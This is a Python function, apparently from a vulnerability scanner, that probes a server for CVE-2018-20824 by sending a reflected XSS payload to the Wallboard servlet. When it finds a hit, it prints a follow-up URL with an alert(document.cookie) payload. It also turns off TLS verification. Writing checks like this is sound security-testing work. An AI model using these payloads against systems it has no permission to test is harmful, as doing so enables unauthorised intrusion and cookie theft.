import requests
from urllib.parse import urlparse
import colorama
from colorama import Fore, Style
import time
import os
import sys
import json
import xml.etree.ElementTree as ET
from urllib.parse import urlparse
import urllib3

def check_cve_2018_20824(base_url):
    """
    Checks for CVE-2018-20824 (XSS vulnerability in Wallboard).
    """
    print(f"\n{Fore.YELLOW}INFO: Checking for CVE-2018-20824 (XSS){Style.RESET_ALL}")
    
    vulnerabilities = ''  # Initialize a list to store discovered vulnerabilities
    headers = {
    'X-Atlassian-Token': 'no-check'
    }

    try:
        # Construct the target URL with the XSS payload
        check_cve_2018_20824_url = f"{base_url.rstrip('/')}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(\"XSS12345\")"
        manual_cve_2018_20824_url = f"{base_url.rstrip('/')}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.cookie)"
        print(f"{Fore.BLUE}[Testing URL]{Style.RESET_ALL}: {check_cve_2018_20824_url}")

        # Send the request
        response = requests.get(check_cve_2018_20824_url, headers=headers, allow_redirects=False, verify=False)

        # Check for the XSS payload in the response
        if "XSS12345" in response.text:
            vulnerability_detail = (f"+ [XXS] Vulnerable to CVE-2018-20824: {check_cve_2018_20824_url}")
            vulnerabilities += (vulnerability_detail)
            print(f"{Fore.GREEN}[+] [XSS] Vulnerable to CVE-2018-20824: {check_cve_2018_20824_url}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] URL: {manual_cve_2018_20824_url}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}- Not Vulnerable to CVE-2018-20824{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}* An error occurred while checking {base_url}: {e}{Style.RESET_ALL}")

    return vulnerabilities  # Return the list of vulnerabilities
